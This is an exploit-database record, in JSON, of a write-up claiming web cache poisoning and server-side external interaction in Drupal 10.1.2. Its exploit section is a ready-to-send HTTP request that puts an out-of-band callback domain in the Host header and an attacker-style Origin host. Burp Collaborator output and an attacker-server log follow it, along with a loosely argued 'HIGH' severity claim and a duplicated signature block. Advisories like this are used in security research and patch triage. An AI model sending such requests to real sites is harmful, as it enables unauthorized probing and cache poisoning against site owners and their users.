{"source": "https://www.exploit-db.com/exploits/51723", "vulnName": "Drupal 10.1.2 - web-cache-poisoning-External-service-interaction", "vulnEDBID": "51723", "vulnCVE": "N/A", "author": "NU11SECUR1TY", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2023-09-08", "vulnContent": "## Title: drupal-10.1.2 web-cache-poisoning-External-service-interaction\n## Author: nu11secur1ty\n## Date: 08/30/2023\n## Vendor: https://www.drupal.org/\n## Software: https://www.drupal.org/download\n## Reference: https://portswigger.net/kb/issues/00300210_external-service-interaction-http\n\n## Description:\nIt is possible to induce the application to perform server-side HTTP\nrequests to arbitrary domains.\nThe payload d7lkti6pq8fjkx12ikwvye34ovuoie680wqjg75.oastify.com was\nsubmitted in the HTTP Host header.\nThe application performed an HTTP request to the specified domain. For\nthe second test, the attacker stored a response\non the server with malicious content. This can be bad for a lot of\nusers of this system if the attacker spreads a malicious URL\nand sends it by email etc. By using a redirect exploit.\n\nSTATUS: HIGH-Vulnerability\n\n[+]Exploit:\n```GET\nGET /drupal/web/?psp4hw87ev=1 HTTP/1.1\nHost: d7lkti6pq8fjkx12ikwvye34ovuoie680wqjg75.oastify.com\nAccept-Encoding: gzip, deflate, psp4hw87ev\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7,\ntext/psp4hw87ev\nAccept-Language: en-US,psp4hw87ev;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111\nSafari/537.36 psp4hw87ev\nConnection: close\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nSec-CH-UA: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"116\", \"Chromium\";v=\"116\"\nSec-CH-UA-Platform: Windows\nSec-CH-UA-Mobile: ?0\nOrigin: https://psp4hw87ev.pwnedhost.com\n```\n[+]Response from Burpcollaborator server:\n```HTTP\nHTTP/1.1 200 OK\nServer: Burp Collaborator https://burpcollaborator.net/\nX-Collaborator-Version: 4\nContent-Type: text/html\nContent-Length: 62\n\n<html><body>zeq5zcbz3x69x9a63ubxidzjlgigmmgifigz</body></html>\n```\n\n[+]Response from Attacker server\n```HTTP\n192.168.100.45 - - [30/Aug/2023 05:52:56] \"GET\n/drupal/web/rss.xml?psp4hw87ev=1 HTTP/1.1\"\n```\n\n## Reproduce:\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/DRUPAL/2013/drupal-10.1.2)\n\n## Proof and Exploit:\n[href](https://www.nu11secur1ty.com/2023/08/drupal-1012-web-cache-poisoning.html)\n\n## Time spend:\n03:35:00\n\n\n-- \nSystem Administrator - Infrastructure Engineer\nPenetration Testing Engineer\nExploit developer at https://packetstormsecurity.com/\nhttps://cve.mitre.org/index.htmlhttps://cxsecurity.com/ and\nhttps://www.exploit-db.com/\n0day Exploit DataBase https://0day.today/\nhome page: https://www.nu11secur1ty.com/\nhiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=\n                          nu11secur1ty <http://nu11secur1ty.com/>\n\n\n-- \nSystem Administrator - Infrastructure Engineer\nPenetration Testing Engineer\nExploit developer at https://packetstormsecurity.com/\nhttps://cve.mitre.org/index.html\nhttps://cxsecurity.com/ and https://www.exploit-db.com/\n0day Exploit DataBase https://0day.today/\nhome page: https://www.nu11secur1ty.com/\nhiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=\n                          nu11secur1ty <http://nu11secur1ty.com/>\n            "}